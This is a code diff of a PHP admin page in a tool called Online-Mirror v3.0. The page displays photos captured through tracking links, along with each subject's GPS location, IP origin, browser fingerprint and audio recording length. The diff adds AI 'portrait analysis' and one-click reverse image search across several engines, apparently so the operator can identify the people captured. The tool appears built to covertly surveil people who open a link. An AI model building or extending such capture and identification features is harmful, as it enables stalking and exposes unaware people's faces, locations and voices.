@@ -1,10 +1,16 @@
 <?php
 /**
- * Online-Mirror 升级版 v2.0 - 照片查看页
+ * Online-Mirror v3.0 - 照片查看页
  * 支持：灯箱大图预览、GPS地图、浏览器指纹、IP归属地
  */
 session_start();
 require_once __DIR__ . '/config.php';
+
+// ========== 封禁IP拦截：禁止查看图片 ==========
+if (isIPBanned()) {
+    $ban_reason = getBanReason();
+    die('<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>访问被拒绝</title><style>body{background:#0f0c29;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,\'Segoe UI\',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;margin:0;padding:20px}.card{background:rgba(255,255,255,0.05);backdrop-filter:blur(20px);border:1px solid rgba(255,80,80,0.2);border-radius:24px;padding:40px;max-width:420px;width:100%;text-align:center}.card .icon{font-size:64px;margin-bottom:16px}.card h1{font-size:22px;color:#ff6b6b;margin:0 0 8px}.card p{color:#8080a0;font-size:14px;line-height:1.6;margin:0}</style></head><body><div class="card"><div class="icon">🚫</div><h1>访问被拒绝</h1><p>' . htmlspecialchars($ban_reason) . '</p></div></body></html>');
+}
 
 $id = trim($_GET['id'] ?? '');
 $type = trim($_GET['type'] ?? '');
@@ -21,15 +27,15 @@ $db = getDB();
 if ($type === 'delete' && isset($_GET['photo_id']) && isLoggedIn()) {
     requireCsrf();
     $photo_id = intval($_GET['photo_id']);
-    $stmt = $db->prepare("SELECT file_path FROM photos WHERE id = ? AND link_id = ?");
+    $stmt = $db->prepare("SELECT file_path FROM mir_photos WHERE id = ? AND link_id = ?");
     $stmt->execute([$photo_id, $id]);
     $photo = $stmt->fetch();
     if ($photo) {
         $filepath = IMG_DIR . $photo['file_path'];
         if (file_exists($filepath)) unlink($filepath);
-        $stmt = $db->prepare("DELETE FROM photos WHERE id = ?");
+        $stmt = $db->prepare("DELETE FROM mir_photos WHERE id = ?");
         $stmt->execute([$photo_id]);
-        $stmt = $db->prepare("UPDATE links SET captures = GREATEST(captures - 1, 0) WHERE link_id = ?");
+        $stmt = $db->prepare("UPDATE mir_links SET captures = GREATEST(captures - 1, 0) WHERE link_id = ?");
         $stmt->execute([$id]);
         addLog($id, 'delete_photo');
     }
@@ -40,16 +46,16 @@ if ($type === 'delete' && isset($_GET['photo_id']) && isLoggedIn()) {
 // 清空所有照片
 if ($type === 'clear' && isLoggedIn()) {
     requireCsrf();
-    $stmt = $db->prepare("SELECT file_path FROM photos WHERE link_id = ?");
+    $stmt = $db->prepare("SELECT file_path FROM mir_photos WHERE link_id = ?");
     $stmt->execute([$id]);
     $photos = $stmt->fetchAll();
     foreach ($photos as $p) {
         $fp = IMG_DIR . $p['file_path'];
         if (file_exists($fp)) unlink($fp);
     }
-    $stmt = $db->prepare("DELETE FROM photos WHERE link_id = ?");
+    $stmt = $db->prepare("DELETE FROM mir_photos WHERE link_id = ?");
     $stmt->execute([$id]);
-    $stmt = $db->prepare("UPDATE links SET captures = 0 WHERE link_id = ?");
+    $stmt = $db->prepare("UPDATE mir_links SET captures = 0 WHERE link_id = ?");
     $stmt->execute([$id]);
     addLog($id, 'clear_photos');
     header("Location: photos.php?id=" . urlencode($id));
@@ -57,7 +63,7 @@ if ($type === 'clear' && isLoggedIn()) {
 }
 
 // 获取照片
-$stmt = $db->prepare("SELECT * FROM photos WHERE link_id = ? ORDER BY created_at DESC");
+$stmt = $db->prepare("SELECT * FROM mir_photos WHERE link_id = ? ORDER BY created_at DESC");
 $stmt->execute([$id]);
 $all_photos = $stmt->fetchAll();
 $total = count($all_photos);
@@ -66,11 +72,12 @@ $page = min($page, $total_pages - 1);
 $photos = array_slice($all_photos, $page * $per_page, $per_page);
 
 // 获取链接信息
-$stmt = $db->prepare("SELECT * FROM links WHERE link_id = ?");
+$stmt = $db->prepare("SELECT * FROM mir_links WHERE link_id = ?");
 $stmt->execute([$id]);
 $link = $stmt->fetch();
 
 $csrf = csrfToken();
+$ai_settings = getAISettings();
 ?>
 <!DOCTYPE html>
 <html lang="zh-CN">
@@ -81,18 +88,18 @@ $csrf = csrfToken();
 <title>照片查看 · <?php echo htmlspecialchars($id); ?></title>
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
 <!-- Spotlight.js 灯箱 -->
-<link rel="stylesheet" href="https://cdn.jsdmirror.cn/npm/spotlight.js@0.7.8/dist/css/spotlight.min.css">
-<script src="https://cdn.jsdmirror.cn/npm/spotlight.js@0.7.8/dist/js/spotlight.min.js"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/spotlight.js@0.7.8/dist/css/spotlight.min.css">
+<script src="https://cdn.jsdelivr.net/npm/spotlight.js@0.7.8/dist/js/spotlight.min.js"></script>
 <script>
 document.addEventListener('DOMContentLoaded', function() {
     if (typeof Spotlight !== 'undefined') {
-        new Spotlight(document.querySelectorAll('[data-spotlight]'));
+        new Spotlight(document.querySelectorAll('.spotlight'));
     }
 });
 </script>
-<!-- Leaflet.js 地图 -->
-<link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css" />
-<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>
+<!-- Leaflet.js 地图（国内CDN） -->
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.css" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/leaflet/1.9.4/leaflet.min.js"></script>
 <style>
 * { margin: 0; padding: 0; box-sizing: border-box; }
 body {
@@ -224,6 +231,110 @@ body {
     border-radius: 4px;
     color: #8080c0;
 }
+
+/* v3.0 AI分析与反向图搜 */
+.ai-btn, .reverse-btn {
+    display:inline-flex; align-items:center; gap:4px;
+    padding:5px 12px; border-radius:6px;
+    font-size:11px; cursor:pointer; transition:all 0.3s; border:none;
+}
+.ai-btn {
+    background:rgba(102,126,234,0.12); color:#667eea;
+}
+.ai-btn:hover { background:rgba(102,126,234,0.25); }
+.ai-btn.loading {
+    background:rgba(255,152,0,0.15); color:#ff9800;
+    pointer-events:none; opacity:0.7;
+}
+.ai-btn.disabled {
+    background:rgba(255,80,80,0.1); color:#ff6b6b;
+    cursor:not-allowed; opacity:0.6;
+}
+.reverse-btn {
+    background:rgba(76,175,80,0.1); color:#4caf50;
+}
+.reverse-btn:hover { background:rgba(76,175,80,0.2); }
+
+.ai-result {
+    display:none;
+    padding:10px 14px 14px;
+    background:rgba(102,126,234,0.06);
+    border-top:1px solid rgba(102,126,234,0.1);
+    font-size:12px; line-height:1.7;
+}
+.ai-result.show { display:block; }
+.ai-result .ai-toggle-bar {
+    display:flex; align-items:center; justify-content:space-between;
+    padding:0 0 6px; margin-bottom:6px;
+    border-bottom:1px solid rgba(255,255,255,0.04);
+}
+.ai-result .ai-toggle-bar .ai-toggle-btn {
+    background:none; border:none; color:#667eea; font-size:11px; cursor:pointer;
+    display:flex; align-items:center; gap:4px; padding:2px 6px;
+    border-radius:4px; transition:all 0.2s;
+}
+.ai-result .ai-toggle-bar .ai-toggle-btn:hover { background:rgba(102,126,234,0.1); }
+.ai-result .ai-loading {
+    text-align:center; padding:12px 0; color:#8080a0;
+}
+.ai-result .ai-loading i { font-size:18px; margin-bottom:6px; display:block; }
+.ai-result .ai-error {
+    text-align:center; padding:8px; color:#ff6b6b; font-size:12px;
+}
+.ai-result .ai-quota {
+    font-size:10px; color:#606080; margin-top:6px; text-align:right;
+}
+.ai-result-inner { }
+.ai-dimension {
+    display:flex; padding:2px 0;
+    border-bottom:1px solid rgba(255,255,255,0.04);
+}
+.ai-dim-key {
+    color:#667eea; font-weight:600; min-width:60px; flex-shrink:0;
+}
+.ai-dim-val { color:#c0c0d0; }
+.ai-line { padding:2px 0; color:#b0b0c0; }
+
+/* 反向图搜弹窗 */
+.reverse-modal {
+    display:none;
+    position:fixed; top:0; left:0; right:0; bottom:0;
+    z-index:9999; background:rgba(0,0,0,0.8);
+    justify-content:center; align-items:center;
+}
+.reverse-modal.show { display:flex; }
+.reverse-modal .modal-box {
+    background:#1a1a2e;
+    border:1px solid rgba(255,255,255,0.12);
+    border-radius:16px; overflow:hidden;
+    width:90vw; max-width:440px;
+}
+.reverse-modal .modal-header {
+    padding:14px 20px; display:flex; justify-content:space-between; align-items:center;
+    border-bottom:1px solid rgba(255,255,255,0.06);
+}
+.reverse-modal .modal-header h3 { font-size:15px; }
+.reverse-modal .modal-header .close-btn {
+    font-size:22px; color:#8080a0; cursor:pointer; border:none; background:none;
+}
+.reverse-modal .modal-header .close-btn:hover { color:#fff; }
+.reverse-modal .modal-body { padding:16px 20px 20px; }
+.reverse-modal .search-option {
+    display:flex; align-items:center; gap:12px;
+    padding:12px 14px; margin-bottom:8px;
+    background:rgba(255,255,255,0.04);
+    border:1px solid rgba(255,255,255,0.08);
+    border-radius:10px; cursor:pointer;
+    text-decoration:none; transition:all 0.3s;
+}
+.reverse-modal .search-option:hover {
+    background:rgba(255,255,255,0.08);
+    border-color:rgba(102,126,234,0.3);
+    transform:translateX(4px);
+}
+.reverse-modal .search-option .so-icon { font-size:20px; width:32px; text-align:center; }
+.reverse-modal .search-option .so-name { font-size:14px; color:#e0e0e0; }
+.reverse-modal .search-option .so-desc { font-size:11px; color:#8080a0; }
 
 /* 标签 */
 .tags-display {
@@ -374,7 +485,7 @@ body {
         <?php foreach ($photos as $photo): ?>
         <div class="photo-card">
             <div class="img-wrap">
-                <a href="img/<?php echo htmlspecialchars($photo['file_path']); ?>" data-spotlight="photos">
+                <a href="img/<?php echo htmlspecialchars($photo['file_path']); ?>" class="spotlight" data-spotlight="photos">
                     <img src="img/<?php echo htmlspecialchars($photo['file_path']); ?>" alt="照片" loading="lazy">
                 </a>
             </div>
@@ -402,22 +513,45 @@ body {
                 <?php endif; ?>
             </div>
             
-            <?php if ($photo['screen_resolution'] || $photo['os'] || $photo['browser']): ?>
+            <?php if ($photo['screen_resolution'] || $photo['os'] || $photo['browser'] || $photo['recording_seconds']): ?>
             <div class="fingerprint">
                 <?php if ($photo['os']): ?><span class="tag"><i class="fas fa-laptop"></i> <?php echo htmlspecialchars($photo['os']); ?></span><?php endif; ?>
                 <?php if ($photo['browser']): ?><span class="tag"><i class="fas fa-globe"></i> <?php echo htmlspecialchars($photo['browser']); ?></span><?php endif; ?>
                 <?php if ($photo['screen_resolution']): ?><span class="tag"><i class="fas fa-expand"></i> <?php echo htmlspecialchars($photo['screen_resolution']); ?></span><?php endif; ?>
                 <?php if ($photo['browser_lang']): ?><span class="tag"><i class="fas fa-language"></i> <?php echo htmlspecialchars($photo['browser_lang']); ?></span><?php endif; ?>
+                <?php if ($photo['recording_seconds'] > 0): ?><span class="tag"><i class="fas fa-microphone"></i> 录音 <?php echo intval($photo['recording_seconds']); ?>秒</span><?php endif; ?>
             </div>
             <?php endif; ?>
             
-            <?php if ($photo['lat'] && $photo['lng']): ?>
-            <div style="padding:0 14px 10px;">
+            <!-- v3.0 AI分析 & 反向图搜 & 地图按钮（合并一行） -->
+            <div style="padding:0 14px 14px;display:flex;gap:6px;flex-wrap:wrap;">
+                <button class="ai-btn" onclick="analyzePhoto('<?php echo htmlspecialchars($photo['file_path']); ?>', this)" title="AI人像分析">
+                    <i class="fas fa-robot"></i> AI分析
+                </button>
+                <button class="reverse-btn" onclick="reverseSearch('<?php echo htmlspecialchars($photo['file_path']); ?>')" title="以图搜图">
+                    <i class="fas fa-search"></i> 反向图搜
+                </button>
+                <?php if ($photo['lat'] && $photo['lng']): ?>
                 <button class="map-btn" onclick="openMap(<?php echo $photo['lat']; ?>, <?php echo $photo['lng']; ?>, '<?php echo htmlspecialchars($photo['city'] ?? '未知位置'); ?>')">
                     <i class="fas fa-map-marked-alt"></i> 查看地图
                 </button>
+                <?php endif; ?>
             </div>
-            <?php endif; ?>
+            <?php 
+            $has_ai_result = !empty($photo['ai_result']);
+            $ai_result_html = $has_ai_result ? formatAIResult($photo['ai_result'], $ai_settings['options'] ?? []) : '';
+            ?>
+            <div class="ai-result <?php echo $has_ai_result ? 'show' : ''; ?>" id="aiResult_<?php echo $photo['id']; ?>">
+                <?php if ($has_ai_result): ?>
+                <div class="ai-toggle-bar">
+                    <span style="font-size:11px;color:#8080a0;"><i class="fas fa-robot" style="color:#667eea;"></i> AI分析结果</span>
+                    <button class="ai-toggle-btn" onclick="toggleAIResult('<?php echo $photo['id']; ?>')">
+                        <i class="fas fa-chevron-up"></i> 收起
+                    </button>
+                </div>
+                <?php echo $ai_result_html; ?>
+                <?php endif; ?>
+            </div>
         </div>
         <?php endforeach; ?>
     </div>
@@ -441,28 +575,38 @@ body {
         document.getElementById('mapModal').classList.add('show');
         document.body.style.overflow = 'hidden';
         
-        setTimeout(function() {
-            if (mapInstance) {
-                mapInstance.remove();
-                mapInstance = null;
-            }
-            
-            mapInstance = L.map('mapContainer', {
-                zoomControl: true,
-                scrollWheelZoom: true
-            }).setView([lat, lng], 15);
-            
-            L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
-                maxZoom: 18,
-                attribution: '&copy; <a href="https://openstreetmap.org/copyright">OSM</a>'
-            }).addTo(mapInstance);
-            
-            L.marker([lat, lng]).addTo(mapInstance)
-                .bindPopup(title || ('📍 ' + lat.toFixed(4) + ', ' + lng.toFixed(4)))
-                .openPopup();
+        // 先让浏览器渲染 modal，再初始化地图
+        requestAnimationFrame(function() {
+            requestAnimationFrame(function() {
+                if (mapInstance) {
+                    mapInstance.remove();
+                    mapInstance = null;
+                }
                 
-            setTimeout(function() { mapInstance.invalidateSize(); }, 200);
-        }, 300);
+                mapInstance = L.map('mapContainer', {
+                    zoomControl: true,
+                    scrollWheelZoom: true,
+                    center: [lat, lng],
+                    zoom: 15
+                });
+                
+                // 使用高德地图瓦片（国内可访问）
+                L.tileLayer('https://{s}.is.autonavi.com/appmaptile?lang=zh_cn&size=1&scale=1&style=8&x={x}&y={y}&z={z}', {
+                    maxZoom: 18,
+                    subdomains: ['webrd01','webrd02','webrd03','webrd04'],
+                    attribution: '&copy; AutoNavi 高德地图'
+                }).addTo(mapInstance);
+                
+                L.marker([lat, lng]).addTo(mapInstance)
+                    .bindPopup(title || ('📍 ' + lat.toFixed(4) + ', ' + lng.toFixed(4)))
+                    .openPopup();
+                
+                // 地图容器尺寸调整
+                setTimeout(function() { 
+                    try { mapInstance.invalidateSize(); } catch(e) {}
+                }, 200);
+            });
+        });
     }
     
     function closeMap() {
@@ -474,8 +618,152 @@ body {
         }
     }
     
+    // v3.0 AI分析功能
+    var analyzingPhotos = {};
+    
+    function analyzePhoto(photoPath, btn) {
+        // 查找对应的结果容器
+        var card = btn.closest('.photo-card');
+        var resultDiv = card.querySelector('.ai-result');
+        var photoId = resultDiv.id.replace('aiResult_', '');
+        
+        // 防止重复点击
+        if (analyzingPhotos[photoId]) return;
+        
+        // 检查是否已有结果
+        if (resultDiv.classList.contains('show') && !resultDiv.querySelector('.ai-loading')) {
+            // 已有结果，收起
+            resultDiv.classList.remove('show');
+            btn.classList.remove('loading');
+            return;
+        }
+        
+        analyzingPhotos[photoId] = true;
+        btn.classList.add('loading');
+        btn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> 分析中...';
+        
+        resultDiv.classList.add('show');
+        resultDiv.innerHTML = '<div class="ai-loading"><i class="fas fa-spinner fa-pulse" style="color:#667eea;"></i>🤔 AI 正在分析照片特征...</div>';
+        
+        var formData = new FormData();
+        formData.append('action', 'analyze');
+        formData.append('link_id', '<?php echo htmlspecialchars($id); ?>');
+        formData.append('photo_path', photoPath);
+        
+        fetch('ajax_ai_analyze.php', {
+            method: 'POST',
+            body: formData
+        })
+        .then(function(r) { return r.json(); })
+        .then(function(data) {
+            analyzingPhotos[photoId] = false;
+            btn.classList.remove('loading');
+            btn.innerHTML = '<i class="fas fa-robot"></i> AI分析';
+            
+            if (data.error) {
+                resultDiv.innerHTML = '<div class="ai-error"><i class="fas fa-exclamation-circle"></i> ' + data.error + '</div>';
+                btn.classList.add('disabled');
+                return;
+            }
+            
+            if (data.success && data.formatted) {
+                resultDiv.innerHTML = '<div class="ai-toggle-bar">' +
+                    '<span style="font-size:11px;color:#8080a0;"><i class="fas fa-robot" style="color:#667eea;"></i> AI分析结果</span>' +
+                    '<button class="ai-toggle-btn" onclick="toggleAIResult(\'' + photoId + '\')">' +
+                        '<i class="fas fa-chevron-up"></i> 收起' +
+                    '</button>' +
+                '</div>' + data.formatted;
+                if (data.quota) {
+                    resultDiv.innerHTML += '<div class="ai-quota">剩余分析次数: ' + data.quota.remaining + '/' + data.quota.quota + '</div>';
+                }
+            } else {
+                resultDiv.innerHTML = '<div class="ai-error"><i class="fas fa-exclamation-circle"></i> 分析失败，请重试</div>';
+            }
+        })
+        .catch(function(err) {
+            analyzingPhotos[photoId] = false;
+            btn.classList.remove('loading');
+            btn.innerHTML = '<i class="fas fa-robot"></i> AI分析';
+            resultDiv.innerHTML = '<div class="ai-error"><i class="fas fa-exclamation-circle"></i> 网络错误，请重试</div>';
+        });
+    }
+    
+    // v3.0 AI结果收起展开
+    function toggleAIResult(photoId) {
+        var div = document.getElementById('aiResult_' + photoId);
+        if (!div) return;
+        var btn = div.querySelector('.ai-toggle-btn');
+        var icon = btn ? btn.querySelector('i') : null;
+        if (div.classList.contains('show')) {
+            div.classList.remove('show');
+            if (icon) { icon.className = 'fas fa-chevron-down'; }
+            if (btn) { btn.innerHTML = '<i class="fas fa-chevron-down"></i> 展开'; }
+        } else {
+            div.classList.add('show');
+            if (icon) { icon.className = 'fas fa-chevron-up'; }
+            if (btn) { btn.innerHTML = '<i class="fas fa-chevron-up"></i> 收起'; }
+        }
+    }
+    
+    // v3.0 反向图搜功能
+    function reverseSearch(photoPath) {
+        var siteUrl = '<?php echo SITE_URL; ?>';
+        var imgUrl = siteUrl + 'img/' + photoPath;
+        
+        // 创建弹窗
+        var modal = document.createElement('div');
+        modal.className = 'reverse-modal show';
+        modal.id = 'reverseModal';
+        modal.innerHTML = '<div class="modal-box">' +
+            '<div class="modal-header">' +
+                '<h3><i class="fas fa-search" style="color:#4caf50;"></i> 以图搜图</h3>' +
+                '<button class="close-btn" onclick="closeReverse()">&times;</button>' +
+            '</div>' +
+            '<div class="modal-body">' +
+                '<p style="font-size:13px;color:#8080a0;margin-bottom:12px;">选择搜索引擎进行反向图片搜索：</p>' +
+                '<a class="search-option" href="https://www.google.com/searchbyimage?image_url=' + encodeURIComponent(imgUrl) + '" target="_blank" rel="noopener">' +
+                    '<div class="so-icon">🔍</div>' +
+                    '<div><div class="so-name">Google 图片搜索</div><div class="so-desc">搜索相似图片，查来源</div></div>' +
+                '</a>' +
+                '<a class="search-option" href="https://image.baidu.com/n/pc_search?queryImageUrl=' + encodeURIComponent(imgUrl) + '&from=pc" target="_blank" rel="noopener">' +
+                    '<div class="so-icon">🌐</div>' +
+                    '<div><div class="so-name">百度识图</div><div class="so-desc">百度以图搜图，适合国内网络</div></div>' +
+                '</a>' +
+                '<a class="search-option" href="https://saucenao.com/search.php?url=' + encodeURIComponent(imgUrl) + '" target="_blank" rel="noopener">' +
+                    '<div class="so-icon">🎨</div>' +
+                    '<div><div class="so-name">SauceNAO</div><div class="so-desc">二次元/动漫图片搜索利器</div></div>' +
+                '</a>' +
+                '<a class="search-option" href="https://yandex.com/images/search?rpt=imageview&url=' + encodeURIComponent(imgUrl) + '" target="_blank" rel="noopener">' +
+                    '<div class="so-icon">🇷🇺</div>' +
+                    '<div><div class="so-name">Yandex 图片搜索</div><div class="so-desc">俄罗斯搜索引擎，效果不错</div></div>' +
+                '</a>' +
+            '</div>' +
+        '</div>';
+        
+        document.body.appendChild(modal);
+        document.body.style.overflow = 'hidden';
+    }
+    
+    function closeReverse() {
+        var modal = document.getElementById('reverseModal');
+        if (modal) {
+            modal.remove();
+            document.body.style.overflow = '';
+        }
+    }
+    
     document.addEventListener('keydown', function(e) {
-        if (e.key === 'Escape') closeMap();
+        if (e.key === 'Escape') {
+            closeMap();
+            closeReverse();
+        }
+    });
+    
+    // 点击遮罩关闭
+    document.addEventListener('click', function(e) {
+        if (e.target.classList.contains('reverse-modal')) {
+            closeReverse();
+        }
     });
     </script>
 
